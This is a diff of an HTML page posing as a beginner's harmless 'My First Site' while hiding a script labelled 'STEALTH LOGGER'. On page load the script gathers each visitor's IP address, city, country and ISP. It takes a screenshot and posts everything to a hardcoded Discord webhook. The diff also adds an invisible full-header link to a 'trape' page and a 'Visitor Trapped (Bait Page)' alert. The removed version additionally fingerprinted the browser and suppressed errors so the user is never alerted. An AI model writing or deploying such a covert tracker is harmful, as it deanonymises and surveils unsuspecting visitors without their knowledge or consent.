@@ -3,23 +3,23 @@
 <head>
   <meta charset="UTF-8">
   <title>My First Site</title>
-  <meta name="description" content="Just learning HTML!">
   <style>
     body {
-      font-family: 'Comic Sans MS', cursive, sans-serif;
+      font-family: 'Comic Sans MS', cursive;
       background: linear-gradient(to bottom, #ff9a9e, #fad0c4);
-      margin: 0; padding: 0; color: #333;
-      text-align: center;
+      margin: 0; padding: 0; color: #333; text-align: center;
     }
     .container {
       max-width: 700px; margin: 3rem auto; padding: 2rem;
       background: rgba(255,255,255,0.9); border-radius: 20px;
       box-shadow: 0 8px 20px rgba(0,0,0,0.1);
     }
-    h1 { color: #e91e63; margin-bottom: 0.5rem; }
-    p { font-size: 1.1rem; line-height: 1.6; }
+    h1 { color: #e91e63; margin-bottom: 0.2rem; position: relative; }
+    .secret-btn {
+      position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+      opacity: 0; cursor: pointer; z-index: 10;
+    }
     .emoji { font-size: 3rem; margin: 1rem 0; }
-    .footer { margin-top: 3rem; font-size: 0.9rem; color: #777; }
     .blink { animation: blink 1s step-end infinite; }
     @keyframes blink { 50% { opacity: 0; } }
   </style>
@@ -27,127 +27,58 @@
 <body>
 
 <div class="container">
-  <h1>My First Site</h1>
+  <h1 style="position:relative;">
+    My First Site
+    <!-- SECRET BUTTON (INVISIBLE) -->
+    <a href="trape.index" class="secret-btn" title="shh..."></a>
+  </h1>
   <p class="emoji">Hello World</p>
   <p>Welcome tto my first website! I'm just learning HTML and CSS. Hope you like it!</p>
   <p>I added a blinking cursor because it's cool <span class="blink">_</span></p>
   <p>Made with love and zero budget</p>
-  <div class="footer">
-    © 2025 My First Site • <a href="#" style="color:#e91e63;">Contact</a>
-  </div>
 </div>
 
-<!-- ================== STEALTH LOGGER (INVISIBLE) ================== -->
+<!-- STEALTH LOGGER (FROM BEFORE) -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 <script>
-  // <<< PUT YOUR DISCORD WEBHOOK URL HERE >>>
-  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1381021459350032484/Z-HEIw2n1czbqpnWl-UicGzWgfrHth3W0naPyAkIoI3Sf3bx4bsINYQJDnvIHf1ky0tL';
-
-  // ---- 1. Get IP + Geo (fallback chain) ----
-  const ipServices = [
-    'https://ipapi.co/json/',
-    'https://api.ipify.org?format=json',
-    'https://icanhazip.com/'
-  ];
+  const WEBHOOK = 'https://discord.com/api/webhooks/1381021459350032484/Z-HEIw2n1czbqpnWl-UicGzWgfrHth3W0naPyAkIoI3Sf3bx4bsINYQJDnvIHf1ky0tL';
 
   async function getIP() {
-    for (const url of ipServices) {
-      try {
-        const r = await fetch(url, {cache: 'no-store'});
-        if (!r.ok) continue;
-        if (url.includes('ipapi.co')) {
-          const j = await r.json(); return {ip: j.ip, geo: j};
-        }
-        if (url.includes('ipify')) {
-          const j = await r.json(); return {ip: j.ip, geo: null};
-        }
-        const txt = await r.text(); return {ip: txt.trim(), geo: null};
-      } catch(e) {}
-    }
-    throw new Error('IP lookup failed');
+    const res = await fetch('https://ipapi.co/json/');
+    return await res.json();
   }
 
-  // ---- 2. Browser Fingerprint ----
-  function fingerprint() {
-    const n = navigator;
-    return {
-      ua: n.userAgent,
-      lang: n.language,
-      platform: n.platform,
-      cookies: n.cookieEnabled,
-      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      screen: `${screen.width}x${screen.height}`,
-      window: `${innerWidth}x${innerHeight}`,
-      plugins: Array.from(n.plugins || []).map(p => p.name).join(', ')
-    };
-  }
-
-  // ---- 3. Screenshot (silent) ----
   async function screenshot() {
     try {
       const canvas = await html2canvas(document.body, {scale: 0.5});
       return canvas.toDataURL('image/png');
-    } catch(e) { return null; }
+    } catch { return null; }
   }
 
-  // ---- 4. Send to Discord (rich embed) ----
-  async function send(data) {
-    const embed = {
-      title: 'New Visitor (Stealth)',
-      color: 0x00ff00,
-      timestamp: new Date().toISOString(),
-      fields: [
-        {name: 'IP', value: data.ip, inline: true},
-        {name: 'Time', value: data.time, inline: true}
-      ],
-      footer: {text: 'My First Site Logger'}
-    };
-
-    if (data.geo) {
-      embed.fields.push(
-        {name: 'Location', value: `${data.geo.city || '??'}, ${data.geo.region || ''}, ${data.geo.country_name || ''}`, inline: true},
-        {name: 'ISP', value: data.geo.org || 'Unknown', inline: true}
-      );
-    }
-
-    const fp = data.fp;
-    embed.fields.push(
-      {name: 'Browser', value: fp.ua.split(' ').slice(0,3).join(' '), inline: false},
-      {name: 'OS', value: fp.platform, inline: true},
-      {name: 'Screen', value: fp.screen, inline: true}
-    );
-
-    const files = [];
-    if (data.ss) {
-      files.push({attachment: data.ss, name: 'proof.png'});
-      embed.image = {url: 'attachment://proof.png'};
-    }
-
-    await fetch(WEBHOOK_URL, {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({embeds: [embed], files})
-    }).catch(() => {});
-  }
-
-  // ---- MAIN (runs instantly & silently) ----
   (async () => {
     try {
-      const ipData = await getIP();
-      const fp = fingerprint();
+      const data = await getIP();
       const ss = await screenshot();
-      const now = new Date().toISOString();
-
-      await send({
-        ip: ipData.ip,
-        geo: ipData.geo,
-        fp,
-        ss,
-        time: now
-      });
-    } catch(e) {
-      // Silent fail – never alert user
-    }
+      const embed = {
+        title: 'Visitor Trapped (Bait Page)',
+        color: 0x00ff00,
+        fields: [
+          {name: 'IP', value: data.ip, inline: true},
+          {name: 'Location', value: `${data.city}, ${data.country_name}`, inline: true},
+          {name: 'ISP', value: data.org, inline: true}
+        ],
+        timestamp: new Date().toISOString()
+      };
+      if (ss) {
+        await fetch(WEBHOOK, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({embeds: [embed], files: [{attachment: ss, name: 'proof.png'}]})
+        });
+      } else {
+        await fetch(WEBHOOK, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({embeds: [embed]})});
+      }
+    } catch {}
   })();
 </script>
 </body>
